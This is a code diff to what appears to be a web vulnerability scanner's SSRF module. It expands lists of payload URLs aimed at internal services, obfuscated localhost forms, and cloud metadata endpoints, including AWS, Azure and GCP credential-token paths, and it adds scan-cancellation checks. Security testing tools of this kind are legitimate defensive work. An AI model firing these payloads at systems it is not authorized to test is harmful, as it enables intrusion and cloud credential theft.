@@ -7,7 +7,7 @@ and checks for indicators of successful internal access.
 from __future__ import annotations
 
 import re
-from typing import Any
+from typing import Any, Callable
 from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
 
 import httpx
@@ -26,12 +26,46 @@ INTERNAL_URLS = [
     "http://127.0.0.1:3306/",
     "http://127.0.0.1:6379/",  # Redis
     "http://127.0.0.1:9200/",  # Elasticsearch
+    "http://127.0.0.1:11211/",  # Memcached
+    "http://127.0.0.1:8080/",
+    "http://10.0.0.1/",
+    "http://10.10.10.10/",
+    "http://10.255.255.1/",
+    "http://172.16.0.1/",
+    "http://172.31.255.254/",
+    "http://192.168.0.1/",
+    "http://192.168.56.1/",
+    "http://169.254.169.254/",
+    "http://[::ffff:127.0.0.1]/",
+    "http://127.1/",
+    "http://2130706433/",
+    "http://0177.0.0.1/",
+    "http://0x7f000001/",
+    "http://127.0.0.1.nip.io/",
+    "http://localhost.localdomain/",
+    "http://127.0.0.1:5000/",
+    "http://127.0.0.1:9000/",
+    "http://127.0.0.1:27017/",  # MongoDB
+    "http://127.0.0.1:5432/",  # PostgreSQL
 ]
 
 CLOUD_METADATA_URLS = [
     "http://169.254.169.254/latest/meta-data/",       # AWS
+    "http://169.254.169.254/latest/user-data",
+    "http://169.254.169.254/latest/dynamic/instance-identity/document",
+    "http://169.254.169.254/latest/api/token",  # AWS IMDSv2 token path
     "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
+    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
     "http://metadata.google.internal/computeMetadata/v1/",  # GCP
+    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+    "http://100.100.100.200/latest/meta-data/",  # Alibaba
+    "http://169.254.169.254/openstack/latest/meta_data.json",  # OpenStack
+    "http://metadata.google.internal/computeMetadata/v1/project/project-id",
+    "http://metadata.google.internal/computeMetadata/v1/instance/id",
+    "http://[::ffff:169.254.169.254]/latest/meta-data/",
+    "http://0xA9FEA9FE/latest/meta-data/",
+    "http://2852039166/latest/meta-data/",
+    "http://169.254.169.254.xip.io/latest/meta-data/",
 ]
 
 # Patterns in response body that indicate successful internal access
@@ -72,6 +106,7 @@ def test_ssrf(
     cookie: str | None = None,
     timeout: float = 10.0,
     quick: bool = False,
+    should_stop: Callable[[], bool] | None = None,
 ) -> list[dict[str, Any]]:
     """Run SSRF tests on endpoints whose parameters look URL-like.
 
@@ -85,7 +120,7 @@ def test_ssrf(
 
     # In quick mode: fewer payloads and fewer endpoints
     if quick:
-        all_payloads = INTERNAL_URLS[:3] + CLOUD_METADATA_URLS[:1]
+        all_payloads = INTERNAL_URLS[:6] + CLOUD_METADATA_URLS[:3]
         endpoints = endpoints[:15]
         forms = forms[:5]
     else:
@@ -96,8 +131,14 @@ def test_ssrf(
     ) as client:
         # ── GET parameters ──────────────────────────────────────────
         for url in endpoints:
+            if should_stop and should_stop():
+                log.info("SSRF scan cancelled during GET tests")
+                break
             qs = parse_qs(urlparse(url).query, keep_blank_values=True)
             for param, values in qs.items():
+                if should_stop and should_stop():
+                    log.info("SSRF GET testing cancelled on %s", urlparse(url).path)
+                    break
                 if not _looks_like_url_param(param, values[0] if values else ""):
                     continue
                 sig = (urlparse(url).path, param)
@@ -105,6 +146,8 @@ def test_ssrf(
                     continue
                 seen.add(sig)
                 for payload in all_payloads:
+                    if should_stop and should_stop():
+                        break
                     target = _inject_param(url, param, payload)
                     try:
                         resp = client.get(target)
@@ -118,13 +161,21 @@ def test_ssrf(
 
         # ── POST form parameters ────────────────────────────────────
         for form in forms:
+            if should_stop and should_stop():
+                log.info("SSRF scan cancelled during POST form tests")
+                break
             if form["method"] != "POST":
                 continue
             for inp in form["inputs"]:
+                if should_stop and should_stop():
+                    log.info("SSRF POST testing cancelled on %s", form["action"])
+                    break
                 name = inp["name"]
                 if not name or not _looks_like_url_param(name, inp["value"]):
                     continue
                 for payload in all_payloads:
+                    if should_stop and should_stop():
+                        break
                     data = {i["name"]: i["value"] for i in form["inputs"] if i["name"]}
                     data[name] = payload
                     try:
